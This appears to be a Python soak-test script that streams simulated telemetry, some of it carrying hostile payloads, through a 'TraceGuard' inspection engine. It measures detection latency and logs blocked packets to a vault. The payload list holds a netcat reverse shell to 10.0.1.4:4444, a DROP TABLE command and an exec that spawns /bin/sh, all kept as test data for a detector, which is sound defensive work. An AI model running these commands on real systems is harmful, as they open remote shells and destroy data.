"""
THREE-LINEAGE CORE // LIVE ADVERSARIAL DATA GENERATOR (PRODUCTION TIED)
Pipes simulated real-time infrastructure telemetry into the optimized engine
and writes blocked threat forensics directly into the PrivateAssuranceVault.
"""
import time
import random
import json
import uuid
import sys
import os

# Ensure local package modules are visible in path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from three_lineage.traceguard.engine import OptimizedTraceGuard
from three_lineage.core.vault import PrivateAssuranceVault

class LiveDataStream:
    def __init__(self):
        self.sectors = ["UK_GRID_AUTOMATION", "FINANCIAL_TRANSACTION_GATEWAY"]
        self.safe_methods = ["check_load_balance()", "query_ledger_balance()", "verify_routing_node()"]
        self.hostile_primitives = [
            "os.system('nc -e /bin/sh 10.0.1.4 4444')",
            "db.execute('DROP TABLE transactions CASCADE')",
            "exec('import subprocess; subprocess.Popen([\"/bin/sh\"])')"
        ]

    def emit_telemetry_packet(self) -> str:
        sector = random.choice(self.sectors)
        is_attack = random.random() < 0.05  # 5% adversarial probe rate
        
        if is_attack:
            payload = random.choice(self.hostile_primitives)
            classification = "ADVERSARIAL_PROBE"
        else:
            payload = random.choice(self.safe_methods)
            classification = "ROUTINE_TELEMETRY"

        packet = {
            "telemetry_id": str(uuid.uuid4()),
            "timestamp_epoch": time.time(),
            "origin_sector": sector,
            "data_classification": classification,
            "runtime_payload": payload,
            "system_node_id": f"uk-node-{random.randint(100, 999)}"
        }
        return json.dumps(packet)

def run_live_pipeline_soak():
    print("--- THREE-LINEAGE LIVE DATA STREAM & VAULT SOAK ---")
    print("[+] Optimized TraceGuard Engine & Vault Linked. Initializing ingestion...")
    
    stream = LiveDataStream()
    guard = OptimizedTraceGuard()
    vault = PrivateAssuranceVault(vault_path="vault_live_soak.dat")

    total_processed = 0
    threats_blocked = 0
    total_latency_ns = 0
    start_time = time.monotonic()

    try:
        while True:
            raw_packet_json = stream.emit_telemetry_packet()
            packet_data = json.loads(raw_packet_json)
            
            total_processed += 1
            payload = packet_data["runtime_payload"]

            # High-precision timing capture for hot-path evaluation
            t_start = time.perf_counter_ns()
            inspection = guard.inspect({"action_text": payload})
            t_duration = time.perf_counter_ns() - t_start
            total_latency_ns += t_duration

            if not inspection["ast_safe"]:
                threats_blocked += 1
                elapsed = time.monotonic() - start_time
                
                # Commit forensic evidence directly to the cryptographic vault
                audit_uuid = f"TL-LIVE-{total_processed}-{int(time.time())}"
                vault.commit_breach_forensics(
                    audit_uuid=audit_uuid,
                    risk_score=inspection["risk_score"],
                    telemetry={
                        "packet": packet_data,
                        "inspection": inspection,
                        "latency_ns": t_duration
                    }
                )

                print(f"\n🚨 [{elapsed:.3f}s] THREAT ISOLATED & VAULT SEALED (Engine: {t_duration / 1000:.2f} µs)")
                print(f"   Node: {packet_data['system_node_id']} | Sector: {packet_data['origin_sector']}")
                print(f"   Payload: {payload}")

            if total_processed % 500 == 0:
                elapsed = time.monotonic() - start_time
                avg_latency_us = (total_latency_ns / total_processed) / 1000
                sys.stdout.write(
                    f"\r⏱️ Stream: {elapsed:.1f}s | Packets: {total_processed} | "
                    f"Blocked: {threats_blocked} | Avg Latency: {avg_latency_us:.2f} µs"
                )
                sys.stdout.flush()

            time.sleep(0.001)

    except KeyboardInterrupt:
        elapsed = time.monotonic() - start_time
        avg_latency_us = (total_latency_ns / max(1, total_processed)) / 1000
        print(f"\n\n🛑 Live stream soak paused.")
        print(f"📊 Final Metrics:")
        print(f"   - Total Ingested: {total_processed}")
        print(f"   - Attacks Contained: {threats_blocked}")
        print(f"   - Average Engine Latency: {avg_latency_us:.2f} microseconds per packet")
        print(f"   - Vault Database: vault_live_soak.dat")

if __name__ == "__main__":
    run_live_pipeline_soak()
